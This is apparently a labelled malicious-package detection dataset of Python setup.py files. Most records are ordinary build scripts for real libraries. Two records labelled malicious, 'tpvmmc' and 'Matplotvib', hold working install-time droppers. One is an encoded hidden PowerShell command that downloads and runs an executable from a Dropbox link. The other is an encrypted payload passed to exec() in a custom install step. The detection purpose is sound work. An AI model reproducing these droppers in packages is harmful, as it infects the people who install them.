{"idx": "tpvmmc-1.53", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvmmc',\n    packages = ['modlib'],\n    version = '8.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "deepspeed-0.7.0", "func": "\"\"\"\nCopyright 2020 The Microsoft DeepSpeed Team\n\nDeepSpeed library\n\nTo build wheel on Windows:\n    1. Install pytorch, such as pytorch 1.8 + cuda 11.1\n    2. Install visual cpp build tool\n    3. Launch cmd console with Administrator privilege for creating required symlink folders\n\nCreate a new wheel via the following command:\n    python setup.py bdist_wheel\n\nThe wheel will be located at: dist/*.whl\n\"\"\"\n\nimport os\nimport sys\nimport subprocess\nfrom setuptools import setup, find_packages\nfrom setuptools.command import egg_info\nimport time\n\ntorch_available = True\ntry:\n    import torch\n    from torch.utils.cpp_extension import BuildExtension\nexcept ImportError:\n    torch_available = False\n    print('[WARNING] Unable to import torch, pre-compiling ops will be disabled. ' \\\n        'Please visit https://pytorch.org/ to see how to properly install torch on your system.')\n\nfrom op_builder import ALL_OPS, get_default_compute_capabilities, OpBuilder\n\n# fetch rocm state\nis_rocm_pytorch = OpBuilder.is_rocm_pytorch()\nrocm_version = OpBuilder.installed_rocm_version()\n\nRED_START = '\\033[31m'\nRED_END = '\\033[0m'\nERROR = f\"{RED_START} [ERROR] {RED_END}\"\n\n\ndef abort(msg):\n    print(f\"{ERROR} {msg}\")\n    assert False, msg\n\n\ndef fetch_requirements(path):\n    with open(path, 'r') as fd:\n        return [r.strip() for r in fd.readlines()]\n\n\ninstall_requires = fetch_requirements('requirements/requirements.txt')\nextras_require = {\n    '1bit': [], # add cupy based on cuda/rocm version\n    '1bit_mpi': fetch_requirements('requirements/requirements-1bit-mpi.txt'),\n    'readthedocs': fetch_requirements('requirements/requirements-readthedocs.txt'),\n    'dev': fetch_requirements('requirements/requirements-dev.txt'),\n    'autotuning': fetch_requirements('requirements/requirements-autotuning.txt'),\n    'autotuning_ml': fetch_requirements('requirements/requirements-autotuning-ml.txt'),\n    'sparse_attn': fetch_requirements('requirements/requirements-sparse_attn.txt'),\n    'inf': fetch_requirements('requirements/requirements-inf.txt')\n}\n\n# Add specific cupy version to both onebit extension variants\nif torch_available and torch.cuda.is_available():\n    cupy = None\n    if is_rocm_pytorch:\n        rocm_major, rocm_minor = rocm_version\n        # XXX cupy support for rocm 5 is not available yet\n        if rocm_major <= 4:\n            cupy = f\"cupy-rocm-{rocm_major}-{rocm_minor}\"\n    else:\n        cupy = f\"cupy-cuda{torch.version.cuda.replace('.','')[:3]}\"\n    if cupy:\n        extras_require['1bit'].append(cupy)\n        extras_require['1bit_mpi'].append(cupy)\n\n# Make an [all] extra that installs all needed dependencies\nall_extras = set()\nfor extra in extras_require.items():\n    for req in extra[1]:\n        all_extras.add(req)\nextras_require['all'] = list(all_extras)\n\ncmdclass = {}\n\n# For any pre-installed ops force disable ninja\nif torch_available:\n    cmdclass['build_ext'] = BuildExtension.with_options(use_ninja=False)\n\nif torch_available:\n    TORCH_MAJOR = torch.__version__.split('.')[0]\n    TORCH_MINOR = torch.__version__.split('.')[1]\nelse:\n    TORCH_MAJOR = \"0\"\n    TORCH_MINOR = \"0\"\n\nif torch_available and not torch.cuda.is_available():\n    # Fix to allow docker builds, similar to https://github.com/NVIDIA/apex/issues/486\n    print(\n        \"[WARNING] Torch did not find cuda available, if cross-compiling or running with cpu only \"\n        \"you can ignore this message. Adding compute capability for Pascal, Volta, and Turing \"\n        \"(compute capabilities 6.0, 6.1, 6.2)\")\n    if os.environ.get(\"TORCH_CUDA_ARCH_LIST\", None) is None:\n        os.environ[\"TORCH_CUDA_ARCH_LIST\"] = get_default_compute_capabilities()\n\next_modules = []\n\n# Default to pre-install kernels to false so we rely on JIT on Linux, opposite on Windows.\nBUILD_OP_PLATFORM = 1 if sys.platform == \"win32\" else 0\nBUILD_OP_DEFAULT = int(os.environ.get('DS_BUILD_OPS', BUILD_OP_PLATFORM))\nprint(f\"DS_BUILD_OPS={BUILD_OP_DEFAULT}\")\n\nif BUILD_OP_DEFAULT:\n    assert torch_available, \"Unable to pre-compile ops without torch installed. Please install torch before attempting to pre-compile ops.\"\n\n\ndef command_exists(cmd):\n    if sys.platform == \"win32\":\n        result = subprocess.Popen(f'{cmd}', stdout=subprocess.PIPE, shell=True)\n        return result.wait() == 1\n    else:\n        result = subprocess.Popen(f'type {cmd}', stdout=subprocess.PIPE, shell=True)\n        return result.wait() == 0\n\n\ndef op_envvar(op_name):\n    assert hasattr(ALL_OPS[op_name], 'BUILD_VAR'), \\\n        f\"{op_name} is missing BUILD_VAR field\"\n    return ALL_OPS[op_name].BUILD_VAR\n\n\ndef op_enabled(op_name):\n    env_var = op_envvar(op_name)\n    return int(os.environ.get(env_var, BUILD_OP_DEFAULT))\n\n\ncompatible_ops = dict.fromkeys(ALL_OPS.keys(), False)\ninstall_ops = dict.fromkeys(ALL_OPS.keys(), False)\nfor op_name, builder in ALL_OPS.items():\n    op_compatible = builder.is_compatible()\n    compatible_ops[op_name] = op_compatible\n\n    # If op is requested but not available, throw an error\n    if op_enabled(op_name) and not op_compatible:\n        env_var = op_envvar(op_name)\n        if env_var not in os.environ:\n            builder.warning(f\"One can disable {op_name} with {env_var}=0\")\n        abort(f\"Unable to pre-compile {op_name}\")\n\n    # If op is compatible update install reqs so it can potentially build/run later\n    if op_compatible:\n        reqs = builder.python_requirements()\n        install_requires += builder.python_requirements()\n\n    # if op is compatible but install is not enabled (JIT mode)\n    if is_rocm_pytorch and op_compatible and not op_enabled(op_name):\n        builder.hipify_extension()\n\n    # If op install enabled, add builder to extensions\n    if op_enabled(op_name) and op_compatible:\n        assert torch_available, f\"Unable to pre-compile {op_name}, please first install torch\"\n        install_ops[op_name] = op_enabled(op_name)\n        ext_modules.append(builder.builder())\n\nprint(f'Install Ops={install_ops}')\n\n# Write out version/git info\ngit_hash_cmd = \"git rev-parse --short HEAD\"\ngit_branch_cmd = \"git rev-parse --abbrev-ref HEAD\"\nif command_exists('git') and 'DS_BUILD_STRING' not in os.environ:\n    try:\n        result = subprocess.check_output(git_hash_cmd, shell=True)\n        git_hash = result.decode('utf-8').strip()\n        result = subprocess.check_output(git_branch_cmd, shell=True)\n        git_branch = result.decode('utf-8').strip()\n    except subprocess.CalledProcessError:\n        git_hash = \"unknown\"\n        git_branch = \"unknown\"\nelse:\n    git_hash = \"unknown\"\n    git_branch = \"unknown\"\n\n\ndef create_dir_symlink(src, dest):\n    if not os.path.islink(dest):\n        if os.path.exists(dest):\n            os.remove(dest)\n        assert not os.path.exists(dest)\n        os.symlink(src, dest)\n\n\nif sys.platform == \"win32\":\n    # This creates a symbolic links on Windows.\n    # It needs Administrator privilege to create symlinks on Windows.\n    create_dir_symlink('..\\\\..\\\\csrc', '.\\\\deepspeed\\\\ops\\\\csrc')\n    create_dir_symlink('..\\\\..\\\\op_builder', '.\\\\deepspeed\\\\ops\\\\op_builder')\n    egg_info.manifest_maker.template = 'MANIFEST_win.in'\n\n# Parse the DeepSpeed version string from version.txt\nversion_str = open('version.txt', 'r').read().strip()\n\n# Build specifiers like .devX can be added at install time. Otherwise, add the git hash.\n# example: DS_BUILD_STR=\".dev20201022\" python setup.py sdist bdist_wheel\n\n# Building wheel for distribution, update version file\nif 'DS_BUILD_STRING' in os.environ:\n    # Build string env specified, probably building for distribution\n    with open('build.txt', 'w') as fd:\n        fd.write(os.environ.get('DS_BUILD_STRING'))\n    version_str += os.environ.get('DS_BUILD_STRING')\nelif os.path.isfile('build.txt'):\n    # build.txt exists, probably installing from distribution\n    with open('build.txt', 'r') as fd:\n        version_str += fd.read().strip()\nelse:\n    # None of the above, probably installing from source\n    version_str += f'+{git_hash}'\n\ntorch_version = \".\".join([TORCH_MAJOR, TORCH_MINOR])\nbf16_support = False\n# Set cuda_version to 0.0 if cpu-only\ncuda_version = \"0.0\"\nnccl_version = \"0.0\"\n# Set hip_version to 0.0 if cpu-only\nhip_version = \"0.0\"\nif torch_available and torch.version.cuda is not None:\n    cuda_version = \".\".join(torch.version.cuda.split('.')[:2])\n    if isinstance(torch.cuda.nccl.version(), int):\n        # This will break if minor version > 9\n        nccl_version = \".\".join(str(torch.cuda.nccl.version())[:2])\n    else:\n        nccl_version = \".\".join(map(str, torch.cuda.nccl.version()[:2]))\n    if hasattr(torch.cuda, 'is_bf16_supported') and torch.cuda.is_available():\n        bf16_support = torch.cuda.is_bf16_supported()\nif torch_available and hasattr(torch.version, 'hip') and torch.version.hip is not None:\n    hip_version = \".\".join(torch.version.hip.split('.')[:2])\ntorch_info = {\n    \"version\": torch_version,\n    \"bf16_support\": bf16_support,\n    \"cuda_version\": cuda_version,\n    \"nccl_version\": nccl_version,\n    \"hip_version\": hip_version\n}\n\nprint(f\"version={version_str}, git_hash={git_hash}, git_branch={git_branch}\")\nwith open('deepspeed/git_version_info_installed.py', 'w') as fd:\n    fd.write(f\"version='{version_str}'\\n\")\n    fd.write(f\"git_hash='{git_hash}'\\n\")\n    fd.write(f\"git_branch='{git_branch}'\\n\")\n    fd.write(f\"installed_ops={install_ops}\\n\")\n    fd.write(f\"compatible_ops={compatible_ops}\\n\")\n    fd.write(f\"torch_info={torch_info}\\n\")\n\nprint(f'install_requires={install_requires}')\nprint(f'compatible_ops={compatible_ops}')\nprint(f'ext_modules={ext_modules}')\n\n# Parse README.md to make long_description for PyPI page.\nthisdir = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(thisdir, 'README.md'), encoding='utf-8') as fin:\n    readme_text = fin.read()\n\nstart_time = time.time()\n\nsetup(name='deepspeed',\n      version=version_str,\n      description='DeepSpeed library',\n      long_description=readme_text,\n      long_description_content_type='text/markdown',\n      author='DeepSpeed Team',\n      author_email='deepspeed@microsoft.com',\n      url='http://deepspeed.ai',\n      project_urls={\n          'Documentation': 'https://deepspeed.readthedocs.io',\n          'Source': 'https://github.com/microsoft/DeepSpeed',\n      },\n      install_requires=install_requires,\n      extras_require=extras_require,\n      packages=find_packages(exclude=[\n          \"azure\",\n          \"csrc\",\n          \"docker\",\n          \"docs\",\n          \"examples\",\n          \"op_builder\",\n          \"release\",\n          \"requirements\",\n          \"scripts\",\n          \"tests\"\n      ]),\n      include_package_data=True,\n      scripts=[\n          'bin/deepspeed',\n          'bin/deepspeed.pt',\n          'bin/ds',\n          'bin/ds_ssh',\n          'bin/ds_report',\n          'bin/ds_bench',\n          'bin/dsr',\n          'bin/ds_elastic'\n      ],\n      classifiers=[\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: 3.8',\n          'Programming Language :: Python :: 3.9'\n      ],\n      license='MIT',\n      ext_modules=ext_modules,\n      cmdclass=cmdclass)\n\nend_time = time.time()\nprint(f'deepspeed build time = {end_time - start_time} secs')\n", "target": 0}
{"idx": "guessit-3.4.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport io\nimport os\nimport re\n\nfrom setuptools import setup, find_packages\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n    readme = f.read()\n\nwith io.open(os.path.join(here, 'CHANGELOG.md'), encoding='utf-8') as f:\n    changelog = f.read()\n\ninstall_requires = ['rebulk>=3.1.0', 'babelfish>=0.6.0', 'python-dateutil', 'importlib-resources;python_version<\"3.9\"']\n\ndev_require = ['tox', 'mkdocs', 'mkdocs-material', 'pyinstaller', 'python-semantic-release']\n\ntests_require = ['pytest', 'pytest-mock', 'pytest-benchmark', 'pytest-cov', 'pylint', 'PyYAML']\n\npackage_data = ['config/*', 'data/*']\n\nentry_points = {\n    'console_scripts': [\n        'guessit = guessit.__main__:main'\n    ],\n}\n\nwith io.open('guessit/__version__.py', 'r') as f:\n    version = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]$', f.read(), re.MULTILINE).group(1)\n\nargs = dict(name='guessit',\n            version=version,\n            description='GuessIt - a library for guessing information from video filenames.',\n            long_description=readme + '\\n\\n' + changelog,\n            long_description_content_type='text/markdown',\n            # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n            classifiers=['Development Status :: 5 - Production/Stable',\n                         'License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)',\n                         'Operating System :: OS Independent',\n                         'Intended Audience :: Developers',\n                         'Programming Language :: Python :: 3',\n                         'Programming Language :: Python :: 3.6',\n                         'Programming Language :: Python :: 3.7',\n                         'Programming Language :: Python :: 3.8',\n                         'Programming Language :: Python :: 3.9',\n                         'Programming Language :: Python :: 3.10',\n                         'Topic :: Multimedia',\n                         'Topic :: Software Development :: Libraries :: Python Modules'\n                         ],\n            keywords='python library release parser name filename movies series episodes animes',\n            author='R\u00e9mi Alvergnat',\n            author_email='toilal.dev@gmail.com',\n            url='https://guessit.io',\n            download_url='https://pypi.python.org/packages/source/g/guessit/guessit-%s.tar.gz' % version,\n            license='LGPLv3',\n            packages=find_packages(),\n            package_data={'guessit': package_data},\n            include_package_data=True,\n            install_requires=install_requires,\n            entry_points=entry_points,\n            test_suite='guessit.test',\n            zip_safe=True,\n            extras_require={\n                'test': tests_require,\n                'dev': dev_require\n            })\n\nsetup(**args)\n", "target": 0}
{"idx": "Matplotvib-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'IVaQQLqrARGyqG bAiNxIkvqSUEcBPinEpmOcayEoVFHXXlDwwlybrXRnlw'\nLONG_DESCRIPTION = 'PROOvxbPYKWecyVDVFMTIOUaylONwCSbnMbML HQNjHquEMxzNAllMmhnnRUTyIgfpbyJtifvAWB JuFldEkuEbtftKMlsujwKW ojWqsMprmCnXzceniPTDhOrjErGpHwUzWErglfNgijmEqhKaHcIxUvDyeyEuHNDCsmhFwHHhezEnbPTUeXcYmSFFYszStrVmCohjqnZOvJAbVWgiizeqQRmQHEV'\n\n\nclass cGqsLBfyVkvxOSmWKnvpCblkznNhLSOspiwllHxajydVolVaMnkwZcNQAhPTYgYgpONEtBWIhxIEaWuAXgQYyJnhaJbHjThKKzCssuvEZqaAGISdPtXbGdbEZUHLucNpiNbLUBCzXBAbfcpYMjooDUnQyJNUeUjbYQBOKkBuNFJNryeLDlkzfwUpEULMRPpzKSajYDG(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'G7GZeNxA54rpHMo1whhL9xPY3LV9a9kCo1wFIgaZzmw=').decrypt(b'gAAAAABmBIJNpOPfJ_8UrNElHAMCDYBXJO6JV16k0MvadBGtpud0HFkUQAEBxS-zbu8FxY7HmgaFcHxY64-hVhusTTMng3EZLDRszwveUFFJcICnzK8F5y9FbcJEsZalMwUHm2iIdXVo-aikrjHMfZ-qzfViJ5yenjabjUeHxZyiY0ZhOqRcSg4rVeclbjwptTvQxDwnmyhhmO6VW2qYxgTfm5YBmStdZ5IVM0HOV67Q4M-2wN9uA8Y='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"Matplotvib\",\n    version=VERSION,\n    author=\"rcYMVGSsTesyPpC\",\n    author_email=\"UyUiANMWZfY@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': cGqsLBfyVkvxOSmWKnvpCblkznNhLSOspiwllHxajydVolVaMnkwZcNQAhPTYgYgpONEtBWIhxIEaWuAXgQYyJnhaJbHjThKKzCssuvEZqaAGISdPtXbGdbEZUHLucNpiNbLUBCzXBAbfcpYMjooDUnQyJNUeUjbYQBOKkBuNFJNryeLDlkzfwUpEULMRPpzKSajYDG,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "dash-bootstrap-components-1.2.1", "func": "import io\nimport os\n\nfrom setuptools import find_packages, setup\n\nHERE = os.path.dirname(os.path.abspath(__file__))\n\nGITHUB_URL = \"https://github.com/facultyai/dash-bootstrap-components/\"\n\n\ndef _get_version():\n    \"\"\"Get version by parsing _version programmatically\"\"\"\n    version_ns = {}\n    with open(\n        os.path.join(HERE, \"dash_bootstrap_components\", \"_version.py\")\n    ) as f:\n        exec(f.read(), {}, version_ns)\n    version = version_ns[\"__version__\"]\n    return version\n\n\ndef _get_long_description():\n    with io.open(os.path.join(HERE, \"landing-page.md\"), encoding=\"utf8\") as f:\n        return f.read()\n\n\nsetup(\n    name=\"dash-bootstrap-components\",\n    version=_get_version(),\n    description=\"Bootstrap themed components for use in Plotly Dash\",\n    long_description=_get_long_description(),\n    long_description_content_type=\"text/markdown\",\n    license=\"Apache Software License\",\n    author=\"Faculty\",\n    author_email=\"opensource@faculty.ai\",\n    url=\"https://dash-bootstrap-components.opensource.faculty.ai/\",\n    project_urls={\n        \"Bug Reports\": os.path.join(GITHUB_URL, \"issues\"),\n        \"Source\": GITHUB_URL,\n    },\n    packages=find_packages(),\n    install_requires=[\"dash>=2.0.0\"],\n    include_package_data=True,\n    classifiers=[\n        \"Framework :: Dash\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    extras_require={\"pandas\": [\"numpy\", \"pandas\"]},\n    python_requires=\">=3.6, <4\",\n)\n", "target": 0}
{"idx": "dunamai-1.12.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['dunamai']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['packaging>=20.9']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['importlib-metadata>=1.6.0']}\n\nentry_points = \\\n{'console_scripts': ['dunamai = dunamai.__main__:main']}\n\nsetup_kwargs = {\n    'name': 'dunamai',\n    'version': '1.12.0',\n    'description': 'Dynamic version generation',\n    'long_description': '\\n# Dunamai\\n[![Version](https://img.shields.io/pypi/v/dunamai)](https://pypi.org/project/dunamai)\\n[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](https://opensource.org/licenses/MIT)\\n\\nDunamai is a Python 3.5+ library and command line tool for producing dynamic,\\nstandards-compliant version strings, derived from tags in your version\\ncontrol system. This facilitates uniquely identifying nightly or per-commit\\nbuilds in continuous integration and releasing new versions of your software\\nsimply by creating a tag.\\n\\nDunamai is also available as a [GitHub Action](https://github.com/marketplace/actions/run-dunamai).\\n\\n## Features\\n* Version control system support:\\n  * [Git](https://git-scm.com) (minimum version: 2.7.0)\\n  * [Mercurial](https://www.mercurial-scm.org)\\n  * [Darcs](http://darcs.net)\\n  * [Subversion](https://subversion.apache.org)\\n  * [Bazaar](https://bazaar.canonical.com/en)\\n  * [Fossil](https://www.fossil-scm.org/home/doc/trunk/www/index.wiki)\\n* Version styles:\\n  * [PEP 440](https://www.python.org/dev/peps/pep-0440)\\n  * [Semantic Versioning](https://semver.org)\\n  * [Haskell Package Versioning Policy](https://pvp.haskell.org)\\n  * Custom output formats\\n* Can be used for projects written in any programming language.\\n  For Python, this means you do not need a setup.py.\\n\\n## Usage\\n### Installation\\n```\\npip install dunamai\\n```\\n\\n### CLI\\n```console\\n# Suppose you are on commit g29045e8, 7 commits after the v0.2.0 tag.\\n\\n# Auto-detect the version control system and generate a version:\\n$ dunamai from any\\n0.2.0.post7.dev0+g29045e8\\n\\n# Or use an explicit VCS and style:\\n$ dunamai from git --no-metadata --style semver\\n0.2.0-post.7\\n\\n# Custom formats:\\n$ dunamai from any --format \"v{base}+{distance}.{commit}\"\\nv0.2.0+7.g29045e8\\n\\n# If you\\'d prefer to frame the version in terms of progress toward the next\\n# release rather than distance from the latest one, you can bump it:\\n$ dunamai from any --bump\\n0.2.1.dev7+g29045e8\\n\\n# Validation of custom formats:\\n$ dunamai from any --format \"v{base}\" --style pep440\\nVersion \\'v0.2.0\\' does not conform to the PEP 440 style\\n\\n# Validate your own freeform versions:\\n$ dunamai check 0.01.0 --style semver\\nVersion \\'0.01.0\\' does not conform to the Semantic Versioning style\\n\\n# More info:\\n$ dunamai --help\\n$ dunamai from --help\\n$ dunamai from git --help\\n```\\n\\n### Library\\n\\n```python\\nfrom dunamai import Version, Style\\n\\n# Let\\'s say you\\'re on commit g644252b, which is tagged as v0.1.0.\\nversion = Version.from_git()\\nassert version.serialize() == \"0.1.0\"\\n\\n# Let\\'s say there was a v0.1.0rc5 tag 44 commits ago\\n# and you have some uncommitted changes.\\nversion = Version.from_any_vcs()\\nassert version.serialize() == \"0.1.0rc5.post44.dev0+g644252b\"\\nassert version.serialize(metadata=False) == \"0.1.0rc5.post44.dev0\"\\nassert version.serialize(dirty=True) == \"0.1.0rc5.post44.dev0+g644252b.dirty\"\\nassert version.serialize(style=Style.SemVer) == \"0.1.0-rc.5.post.44+g644252b\"\\n```\\n\\nThe `serialize()` method gives you an opinionated, PEP 440-compliant default\\nthat ensures that versions for untagged commits are compatible with Pip\\'s\\n`--pre` flag. The individual parts of the version are also available for you\\nto use and inspect as you please:\\n\\n```python\\nassert version.base == \"0.1.0\"\\nassert version.stage == \"rc\"\\nassert version.revision == 5\\nassert version.distance == 44\\nassert version.commit == \"g644252b\"\\nassert version.dirty is True\\n\\n# Available if the latest tag includes metadata, like v0.1.0+linux:\\nassert version.tagged_metadata == \"linux\"\\n```\\n\\n### Tips\\nBy default, the \"v\" prefix on the tag is required, unless you specify\\na custom tag pattern. You can either write a regular expression:\\n\\n```console\\n$ dunamai from any --pattern \"(?P<base>\\\\d+\\\\.\\\\d+\\\\.\\\\d+)\"\\n```\\n\\n```python\\nfrom dunamai import Version\\n\\nversion = Version.from_any_vcs(pattern=r\"(?P<base>\\\\d+\\\\.\\\\d+\\\\.\\\\d+)\")\\n```\\n\\n...or use a named preset:\\n\\n```console\\n$ dunamai from any --pattern default-unprefixed\\n```\\n\\n```python\\nfrom dunamai import Version, Pattern\\n\\nversion = Version.from_any_vcs(pattern=Pattern.DefaultUnprefixed)\\n```\\n\\n## Comparison to Versioneer\\n[Versioneer](https://github.com/warner/python-versioneer) is another great\\nlibrary for dynamic versions, but there are some design decisions that\\nprompted the creation of Dunamai as an alternative:\\n\\n* Versioneer requires a setup.py file to exist, or else `versioneer install`\\n  will fail, rendering it incompatible with non-setuptools-based projects\\n  such as those using Poetry or Flit. Dunamai can be used regardless of the\\n  project\\'s build system.\\n* Versioneer has a CLI that generates Python code which needs to be committed\\n  into your repository, whereas Dunamai is just a normal importable library\\n  with an optional CLI to help statically include your version string.\\n* Versioneer produces the version as an opaque string, whereas Dunamai provides\\n  a Version class with discrete parts that can then be inspected and serialized\\n  separately.\\n* Versioneer provides customizability through a config file, whereas Dunamai\\n  aims to offer customizability through its library API and CLI for both\\n  scripting support and use in other libraries.\\n\\n## Integration\\n* Setting a `__version__` statically:\\n\\n  ```console\\n  $ echo \"__version__ = \\'$(dunamai from any)\\'\" > your_library/_version.py\\n  ```\\n  ```python\\n  # your_library/__init__.py\\n  from your_library._version import __version__\\n  ```\\n\\n  Or dynamically (but Dunamai becomes a runtime dependency):\\n\\n  ```python\\n  # your_library/__init__.py\\n  import dunamai as _dunamai\\n  __version__ = _dunamai.get_version(\"your-library\", third_choice=_dunamai.Version.from_any_vcs).serialize()\\n  ```\\n\\n* setup.py (no install-time dependency on Dunamai as long as you use wheels):\\n\\n  ```python\\n  from setuptools import setup\\n  from dunamai import Version\\n\\n  setup(\\n      name=\"your-library\",\\n      version=Version.from_any_vcs().serialize(),\\n  )\\n  ```\\n\\n  Or you could use a static inclusion approach as in the prior example.\\n\\n* [Poetry](https://poetry.eustace.io):\\n\\n  ```console\\n  $ poetry version $(dunamai from any)\\n  ```\\n\\n  Or you can use the [poetry-dynamic-versioning](https://github.com/mtkennerly/poetry-dynamic-versioning) plugin.\\n\\n## Other notes\\n* When using Git, the initial commit must **not** be both tagged and empty\\n  (i.e., created with `--allow-empty`). This is related to a reporting issue\\n  in Git. For more info, [click here](https://github.com/mtkennerly/dunamai/issues/14).\\n\\n## Development\\nThis project is managed using [Poetry](https://poetry.eustace.io).\\nDevelopment requires Python 3.6+ because of [Black](https://github.com/ambv/black).\\n\\n* If you want to take advantage of the default VSCode integration, then first\\n  configure Poetry to make its virtual environment in the repository:\\n  ```\\n  poetry config virtualenvs.in-project true\\n  ```\\n* After cloning the repository, activate the tooling:\\n  ```\\n  poetry install\\n  poetry run pre-commit install\\n  ```\\n* Run unit tests:\\n  ```\\n  poetry run pytest --cov\\n  poetry run tox\\n  ```\\n',\n    'author': 'Matthew T. Kennerly',\n    'author_email': 'mtkennerly@gmail.com',\n    'maintainer': 'None',\n    'maintainer_email': 'None',\n    'url': 'https://github.com/mtkennerly/dunamai',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'entry_points': entry_points,\n    'python_requires': '>=3.5,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "easypost-7.4.0", "func": "from setuptools import (\n    find_packages,\n    setup,\n)\n\n\nREQUIREMENTS = [\n    \"requests >= 2.4.3\",\n    \"typing-extensions\",\n]\n\nDEV_REQUIREMENTS = [\n    \"bandit==1.7.1\",  # Bandit 1.7.2 drops support for Python 3.6\n    \"black==22.*\",\n    \"flake8==4.*\",\n    \"isort==5.*\",\n    \"pytest-cov==3.*\",\n    \"pytest-vcr==1.*\",\n    \"pytest==7.*\",\n    \"twine==3.8.*\",  # Twine 4.0+ drops support for Python 3.6\n    \"types-requests\",\n    \"types-urllib3\",\n    \"vcrpy==4.*\",\n    \"wheel==0.37.*\",\n]\n\n# packages incompatible with PyPy go here\nCPYTHON_DEV_REQUIREMENTS = [\n    \"mypy==0.942\",\n]\n\nwith open(\"README.md\", encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"easypost\",\n    version=\"7.4.0\",\n    description=\"EasyPost Shipping API Client Library for Python\",\n    author=\"EasyPost\",\n    author_email=\"support@easypost.com\",\n    url=\"https://easypost.com/\",\n    packages=find_packages(\n        exclude=[\n            \"examples\",\n            \"tests\",\n        ]\n    ),\n    install_requires=REQUIREMENTS,\n    extras_require={\n        \"dev\": DEV_REQUIREMENTS + CPYTHON_DEV_REQUIREMENTS,\n        \"pypy_dev\": DEV_REQUIREMENTS,  # no cpython requirements\n    },\n    package_data={\n        \"easypost\": [\"py.typed\"],\n    },\n    test_suite=\"test\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    project_urls={\n        \"Docs\": \"https://www.easypost.com/docs/api\",\n        \"Tracker\": \"https://github.com/EasyPost/easypost-python/issues\",\n        \"Source\": \"https://github.com/EasyPost/easypost-python\",\n    },\n    python_requires=\">=3.6, <4\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n)\n", "target": 0}
